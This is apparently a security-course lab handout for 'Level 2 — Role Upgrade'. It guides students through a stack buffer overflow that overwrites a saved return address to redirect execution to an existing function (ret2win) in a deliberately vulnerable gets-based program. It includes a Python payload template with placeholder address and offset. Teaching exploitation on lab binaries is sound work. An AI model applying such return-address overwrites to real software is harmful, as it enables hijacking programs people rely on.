# Level 2 — "Role Upgrade" (simple control flow)

Level 1 only corrupted **data** (the grade string). Level 2 changes
**where the program goes next**.

You are printed as `student`. Overwrite the saved return address with the
address of `professor_mode()` so the CPU jumps there and prints
`professor` instead.

**Win condition:**

```text
Logged in as : professor
*** ROLE ELEVATED :: CONTROL FLOW HIJACKED ***
*** LEVEL 2 CLEARED ***
```

No NOP sled. No shellcode. No root shell. Exact address of an existing
function (ret2win).

---

## Why this is not a NOP sled

You know `professor_mode`'s address exactly (`nm`, GDB, or the program hint).
You aim the return address at that one function. A sled is only useful when
you must land in a **region** of injected bytes and your aim might be off.

---

## Step 1 — Build

```bash
make
file vulnerable
```

**Read the compiler warnings** (especially about `gets`). Learning to read
what `gcc` tells you is part of this course.

## Step 2 — Find `professor_mode`

```bash
nm vulnerable | grep professor_mode
# or use the printed [hint] address
```

## Step 3 — Find the offset

`buffer[64]` plus frame/alignment padding. **Measure on your VM.**

## Step 4 — Payload

```python
import sys, struct
prof = 0xREPLACE_ME
offset = REPLACE_ME
sys.stdout.buffer.write(b"A" * offset + struct.pack("<I", prof))
```

```bash
python3 solve.py | ./vulnerable
```

## Step 5 — Submit

- Payload / addresses / offset
- 3–5 sentences: what the return address normally does, and how overwriting
  it “upgrades” student → professor without editing the print string in place
